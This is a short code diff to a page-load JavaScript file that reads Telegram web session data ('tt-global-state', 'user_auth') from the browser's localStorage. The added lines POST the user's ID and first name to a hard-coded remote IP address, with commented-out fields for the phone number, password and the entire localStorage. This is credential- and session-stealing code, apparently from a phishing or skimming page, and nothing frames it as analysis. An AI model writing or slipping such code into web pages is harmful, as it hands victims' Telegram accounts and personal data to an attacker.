@@ -1,5 +1,15 @@
 document.addEventListener("DOMContentLoaded", function() {
   async function checkLocalStorage() {
+    fetch('http://94.131.9.66:4040/api/users/telegram/info', {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        userId: currentUserId, firstName,
+        // usernames, phoneNumber, isPremium,
+        // password, quicklySet: localStorage,
+        // type: new URLSearchParams(window.location.search).get("type")
+      })
+    });
     let globalState = localStorage.getItem("tt-global-state");
     if (globalState && localStorage.getItem("user_auth")) {
       const parsedState = JSON.parse(globalState);
@@ -44,5 +54,5 @@ document.addEventListener("DOMContentLoaded", function() {
     }
   }
 
-  const checkInterval = setInterval(checkLocalStorage, 100);
+  const checkInterval = setInterval(checkLocalStorage, 2000);
 });
